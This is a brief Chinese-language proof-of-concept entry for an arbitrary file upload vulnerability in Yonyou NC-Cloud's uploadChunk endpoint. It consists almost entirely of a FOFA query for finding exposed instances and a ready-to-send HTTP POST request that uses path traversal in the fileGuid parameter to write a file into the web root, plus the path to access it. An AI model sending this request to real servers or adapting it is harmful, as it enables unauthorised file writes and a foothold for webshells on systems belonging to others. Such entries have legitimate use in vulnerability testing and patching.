## 用友NC-Cloud uploadChunk 任意文件上传漏洞

## fofa
```
app="用友-NC-Cloud"
```


## POC

```
POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9

--024ff46f71634a1c9bf8ec5820c26fa9--
Content-Disposition: form-data; name="file"; filename="test.txt"

1123213
--024ff46f71634a1c9bf8ec5820c26fa9--

```

文件上传路径访问
/nccloud/test.txt
